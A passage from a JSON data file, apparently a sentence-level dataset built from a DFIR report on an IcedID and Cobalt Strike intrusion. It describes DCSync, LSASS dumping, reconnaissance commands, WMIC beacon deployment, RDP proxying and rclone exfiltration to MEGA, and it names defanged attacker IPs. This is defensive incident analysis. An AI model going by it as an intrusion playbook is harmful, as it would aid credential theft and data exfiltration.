        "line": 103,
        "index": 3956
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S104",
        "text": "Credentials were also dumped via DCSync using two compromised high privilege accounts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 104,
        "index": 3957
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S105",
        "text": "The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 105,
        "index": 3958
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S106",
        "text": "DCSync was observed across 12 events, with separate events for each object ID.",
        "type": "",
        "report": "r-dfir-3",
        "line": 106,
        "index": 3959
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S107",
        "text": "It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.",
        "type": "",
        "report": "r-dfir-3",
        "line": 107,
        "index": 3960
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S108",
        "text": "For additional details, SpecterOps has an article covering the DCSync technique.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 108,
        "index": 3961
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S109",
        "text": "Multiple injections into the LSASS process were observed on multiple hosts.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 109,
        "index": 3962
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S110",
        "text": "Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.",
        "type": "",
        "report": "r-dfir-3",
        "line": 110,
        "index": 3963
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S111",
        "text": "Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 111,
        "index": 3964
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S112",
        "text": "This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 112,
        "index": 3965
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S113",
        "text": "A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration.",
        "type": "",
        "report": "r-dfir-3",
        "line": 113,
        "index": 3966
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S114",
        "text": "Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 114,
        "index": 3967
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S115",
        "text": "From the IcedID malware running via Rundll32, the following LOLBAS commands were observed:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 115,
        "index": 3968
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S116",
        "text": "From Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 116,
        "index": 3969
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S117",
        "text": "Discovery commands observed from other Cobalt Strike beacons using LOLBAS included:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 117,
        "index": 3970
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S118",
        "text": "systeminfo netstat -anop tcp cmd.exe /C echo %%temp%% cmd.exe /C hostname cmd.exe /C nslookup hostname\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 118,
        "index": 3971
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S119",
        "text": "Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module.",
        "type": "",
        "report": "r-dfir-3",
        "line": 119,
        "index": 3972
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S120",
        "text": "One interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 120,
        "index": 3973
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S121",
        "text": "Domain computers\u2019 properties were then enumerated using the Get-ADComputer.",
        "type": "",
        "report": "r-dfir-3",
        "line": 121,
        "index": 3974
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S122",
        "text": "PowerShell cmdlet and names were exported in a CSV file named ADComputers.csv.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 122,
        "index": 3975
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S123",
        "text": "In addition, threat actors searched for Active Directory related DLLs in other directories:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 123,
        "index": 3976
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S124",
        "text": "We observed mistakes made by the threat actors during hands-on keyboard activities, these included typos and incorrect use of commands.",
        "type": "",
        "report": "r-dfir-3",
        "line": 124,
        "index": 3977
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S125",
        "text": "An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name.",
        "type": "",
        "report": "r-dfir-3",
        "line": 125,
        "index": 3978
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S126",
        "text": "Another example, the misspelling of administrators:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 126,
        "index": 3979
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S127",
        "text": "net group administartors /domain\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 127,
        "index": 3980
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S128",
        "text": "Further examples included typos of commands:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 128,
        "index": 3981
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S129",
        "text": "Other operator errors observed included the use of Cobalt Strike commands being passed as a parameter instead of a beacon task.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 129,
        "index": 3982
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S130",
        "text": "The use of DCSync is documented in a previous TheDFIRReport titled \u2018Cobalt Strike, a Defender\u2019s Guide\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 130,
        "index": 3983
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S131",
        "text": "During AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 131,
        "index": 3984
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S132",
        "text": "Two file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io.",
        "type": "",
        "report": "r-dfir-3",
        "line": 132,
        "index": 3985
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S133",
        "text": "Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 133,
        "index": 3986
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S134",
        "text": "On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain.",
        "type": "",
        "report": "r-dfir-3",
        "line": 134,
        "index": 3987
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S135",
        "text": "Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 135,
        "index": 3988
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S136",
        "text": "The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 136,
        "index": 3989
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S137",
        "text": "In addition, the threat actors also used Internet Explorer on the domain controller to search Bing.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 137,
        "index": 3990
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S138",
        "text": "This is quite unusual to search directly on the victim\u2019s browser.",
        "type": "",
        "report": "r-dfir-3",
        "line": 138,
        "index": 3991
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S139",
        "text": "The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 139,
        "index": 3992
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S140",
        "text": "Other tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets.",
        "type": "",
        "report": "r-dfir-3",
        "line": 140,
        "index": 3993
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S141",
        "text": "We have a detailed report covering Invoke-ShareFinder.",
        "type": "",
        "report": "r-dfir-3",
        "line": 141,
        "index": 3994
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S142",
        "text": "In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 142,
        "index": 3995
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S143",
        "text": "Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 143,
        "index": 3996
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S144",
        "text": "Executing this query would return all events in the Security log that references the specified account and with a source network address.",
        "type": "",
        "report": "r-dfir-3",
        "line": 144,
        "index": 3997
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S145",
        "text": "Events returned would include process creation, logins, etc.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 145,
        "index": 3998
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S146",
        "text": "Its likely that this discovery technique forms an extension of T1033 \u2013 System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.",
        "type": "",
        "report": "r-dfir-3",
        "line": 146,
        "index": 3999
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S147",
        "text": "Other discovery activities observed included a domain host discovery script via PowerShell.",
        "type": "",
        "report": "r-dfir-3",
        "line": 147,
        "index": 4000
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S148",
        "text": "This was double base64 encoded.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 148,
        "index": 4001
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S149",
        "text": "Decoding this revealed another PowerShell Base64 encoded string:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 149,
        "index": 4002
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S150",
        "text": "The -e is short for -EncodedCommand.",
        "type": "",
        "report": "r-dfir-3",
        "line": 150,
        "index": 4003
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S151",
        "text": "The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.",
        "type": "",
        "report": "r-dfir-3",
        "line": 151,
        "index": 4004
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S152",
        "text": "Refer to the Base64 cheatsheet by Forian Roth here.",
        "type": "",
        "report": "r-dfir-3",
        "line": 152,
        "index": 4005
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S153",
        "text": "There are many different variations of EncodedCommand, with shorthand and aliases available.",
        "type": "",
        "report": "r-dfir-3",
        "line": 153,
        "index": 4006
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S154",
        "text": "Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 154,
        "index": 4007
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S155",
        "text": "Decoding this again using CyberChef shows the resulting PowerShell script:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 155,
        "index": 4008
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S156",
        "text": "Other binaries and scripts were dropped onto one endpoint:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 156,
        "index": 4009
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S157",
        "text": "The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.",
        "type": "",
        "report": "r-dfir-3",
        "line": 157,
        "index": 4010
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S158",
        "text": "An Active Directory collection tool named ADGet was dropped into a user\u2019s temp folder and executed with an output filename argument.",
        "type": "",
        "report": "r-dfir-3",
        "line": 158,
        "index": 4011
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S159",
        "text": "No file meta data is provided.",
        "type": "",
        "report": "r-dfir-3",
        "line": 159,
        "index": 4012
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S160",
        "text": "Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 160,
        "index": 4013
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S161",
        "text": "ADGet is an uncommon tool, however, its function is very similar to ADfind\u2013the key difference is that LDAP queries are not passed, they are instead coded into the binary itself.",
        "type": "",
        "report": "r-dfir-3",
        "line": 161,
        "index": 4014
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S162",
        "text": "The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 162,
        "index": 4015
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S163",
        "text": "These files can be viewed with any editor or reader that supports CSV or TSV.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 163,
        "index": 4016
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S164",
        "text": "While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 164,
        "index": 4017
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S165",
        "text": "Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 165,
        "index": 4018
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S166",
        "text": "The AD.bat file had the following commands:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 166,
        "index": 4019
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S167",
        "text": "Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\\windows\\system32\\wbem\\en-US\\htable.xsl).",
        "type": "",
        "report": "r-dfir-3",
        "line": 167,
        "index": 4020
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S168",
        "text": "The HTML was never used.",
        "type": "",
        "report": "r-dfir-3",
        "line": 168,
        "index": 4021
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S169",
        "text": "Its likely the code was reused from other open source pentest enumerations scripts available, such as:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 169,
        "index": 4022
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S170",
        "text": "The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.",
        "type": "",
        "report": "r-dfir-3",
        "line": 170,
        "index": 4023
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S171",
        "text": "This can be useful to determine drives, including mounted network shares.",
        "type": "",
        "report": "r-dfir-3",
        "line": 171,
        "index": 4024
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S172",
        "text": "The dS.bat file was executed by the injected Rundll32.exe process.",
        "type": "",
        "report": "r-dfir-3",
        "line": 172,
        "index": 4025
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S173",
        "text": "During hands-on discovery by the threat actors, the Group Policy was viewed by the Microsoft Management Console application to view Domain Group Policy Objects.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 173,
        "index": 4026
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S174",
        "text": "This can provide useful information concerning any restrictions or configuration settings for hosts on the network.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 174,
        "index": 4027
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S175",
        "text": "Threat actors used wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers.",
        "type": "",
        "report": "r-dfir-3",
        "line": 175,
        "index": 4028
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S176",
        "text": "The payloads were stored on textbin[.]net.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 176,
        "index": 4029
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S177",
        "text": "As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.",
        "type": "",
        "report": "r-dfir-3",
        "line": 177,
        "index": 4030
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S178",
        "text": "Remote Desktop Protocol\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 178,
        "index": 4031
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S179",
        "text": "The beacon C:\\ProgramData\\lsass.exe was used to proxy RDP connections and connect to another computer.",
        "type": "",
        "report": "r-dfir-3",
        "line": 179,
        "index": 4032
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S180",
        "text": "Proxying RDP traffic via a process such as a Cobalt Strike beacon reduces the exposure of the threat actor\u2019s own infrastructure, and blends RDP activity to those of internal hosts on the network.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 180,
        "index": 4033
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S181",
        "text": "The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone).\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 181,
        "index": 4034
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S182",
        "text": "The common processes observed were two injected processes, and the Nigu.exe/lsass.exe.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 182,
        "index": 4035
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S183",
        "text": "These processes are unusual for establishing RDP connections.",
        "type": "",
        "report": "r-dfir-3",
        "line": 183,
        "index": 4036
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S184",
        "text": "During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 184,
        "index": 4037
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S185",
        "text": "An example would be pon.txt.",
        "type": "",
        "report": "r-dfir-3",
        "line": 185,
        "index": 4038
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S186",
        "text": "This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 186,
        "index": 4039
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S187",
        "text": "pon.txt contents:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 187,
        "index": 4040
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S188",
        "text": "Remote services were also created in order to propagate Cobalt Strike beacons in the network.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 188,
        "index": 4041
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S189",
        "text": "AnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection):\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 189,
        "index": 4042
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S190",
        "text": "To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 190,
        "index": 4043
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S191",
        "text": "In addition, multiple text files were also created to store the output of various discovery commands and scripts.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 191,
        "index": 4044
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S192",
        "text": "The malware configuration:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 192,
        "index": 4045
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S193",
        "text": "Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it\u2019s first call back.",
        "type": "",
        "report": "r-dfir-3",
        "line": 193,
        "index": 4046
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S194",
        "text": "This aligns with the domain present in the malware configuration details.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 194,
        "index": 4047
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S195",
        "text": "After the first call over an unencrypted port, command and control traffic moved over to TLS on port 443.",
        "type": "",
        "report": "r-dfir-3",
        "line": 195,
        "index": 4048
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S196",
        "text": "Connections were made to various IP\u2019s over the length of the intrusion, but two made up the majority of the traffic.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 196,
        "index": 4049
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S197",
        "text": "IcedID C2 beaconing over the intrusion:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 197,
        "index": 4050
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S198",
        "text": "There were a number of beacons deployed across the environment, over 70 pipes were created.",
        "type": "",
        "report": "r-dfir-3",
        "line": 198,
        "index": 4051
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S199",
        "text": "The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables.",
        "type": "",
        "report": "r-dfir-3",
        "line": 199,
        "index": 4052
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S200",
        "text": "For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 200,
        "index": 4053
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S201",
        "text": "When beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers.",
        "type": "",
        "report": "r-dfir-3",
        "line": 201,
        "index": 4054
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S202",
        "text": "For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.",
        "type": "",
        "report": "r-dfir-3",
        "line": 202,
        "index": 4055
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S203",
        "text": "The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons.",
        "type": "",
        "report": "r-dfir-3",
        "line": 203,
        "index": 4056
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S204",
        "text": "Over the length of the intrusion four different Cobalt Strike servers were observed in use.",
        "type": "",
        "report": "r-dfir-3",
        "line": 204,
        "index": 4057
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S205",
        "text": "Some lasted the majority of the intrusion while others only lasted a few days.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 205,
        "index": 4058
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S206",
        "text": "Cobalt Strike SSL characteristics:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 206,
        "index": 4059
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S207",
        "text": "Analysis of the Nigu.exe binary indicated use of compression and PE loading characteristics, typically observed for Cobalt Strike payload beacon.",
        "type": "",
        "report": "r-dfir-3",
        "line": 207,
        "index": 4060
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S208",
        "text": "Using CAPA, the results listed the following capabilities:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 208,
        "index": 4061
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S209",
        "text": "Embedded within the binary were strings such as: \u201cinflate 1.2.11 Copyright 1995-2017 Mark Adler\u201d.",
        "type": "",
        "report": "r-dfir-3",
        "line": 209,
        "index": 4062
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S210",
        "text": "Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 210,
        "index": 4063
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S211",
        "text": "Configurations for other Cobalt Strike servers observed:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 211,
        "index": 4064
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S212",
        "text": "As shown above, three different Remote Access Software were used by the threat actor:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 212,
        "index": 4065
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S213",
        "text": "It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 213,
        "index": 4066
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S214",
        "text": "The AnyDesk service password was set manually using the command line as shown below:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 214,
        "index": 4067
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S215",
        "text": "The software packages were bundled within a single Microsoft Software Installer (MSI) package, named hp.msi.",
        "type": "",
        "report": "r-dfir-3",
        "line": 215,
        "index": 4068
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S216",
        "text": "This was installed from the ProgramData folder, resulting in the installation of the remote management tools.",
        "type": "",
        "report": "r-dfir-3",
        "line": 216,
        "index": 4069
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S217",
        "text": "The activity can be correlated against the Application log for MSI installer events (Event ID 1033).\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 217,
        "index": 4070
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S218",
        "text": "During the intrusion, the threat actors were observed accessing collected data such as ShareFinder.txt using Notepad and then copying the contents to the clipboard.",
        "type": "",
        "report": "r-dfir-3",
        "line": 218,
        "index": 4071
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S219",
        "text": "Whilst the process activity indicated Active Directory accounts being used, correlating this activity to Clipboard activity indicated matching sessions, process IDs, and the true source of the user.",
        "type": "",
        "report": "r-dfir-3",
        "line": 219,
        "index": 4072
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S220",
        "text": "In this case, ShareFinder.txt was created in the ProgramData folder by the ShareFinder.ps1 script.",
        "type": "",
        "report": "r-dfir-3",
        "line": 220,
        "index": 4073
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S221",
        "text": "Approximately 2 seconds later, the threat actors accessed this file and copied the contents.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 221,
        "index": 4074
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S222",
        "text": "While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors\u2019 workstation was revealed in several Windows logs.",
        "type": "",
        "report": "r-dfir-3",
        "line": 222,
        "index": 4075
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S223",
        "text": "Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230.",
        "type": "",
        "report": "r-dfir-3",
        "line": 223,
        "index": 4076
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S224",
        "text": "This host name was also in the Security events:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 224,
        "index": 4077
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S225",
        "text": "For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation.",
        "type": "",
        "report": "r-dfir-3",
        "line": 225,
        "index": 4078
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S226",
        "text": "The client address was the internal workstation where the RDP traffic was being proxied through.",
        "type": "",
        "report": "r-dfir-3",
        "line": 226,
        "index": 4079
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S227",
        "text": "During the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14.",
        "type": "",
        "report": "r-dfir-3",
        "line": 227,
        "index": 4080
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S228",
        "text": "This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels.",
        "type": "",
        "report": "r-dfir-3",
        "line": 228,
        "index": 4081
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S229",
        "text": "On the backup server, rclone.exe was used in order to exfiltrate data to a MEGA cloud storage.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 229,
        "index": 4082
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S230",
        "text": "From the rclone.exe configuration file, we can retrieve the user\u2019s mail address and password.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 230,
        "index": 4083
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S231",
        "text": "Interestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike.",
        "type": "",
        "report": "r-dfir-3",
        "line": 231,
        "index": 4084
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S232",
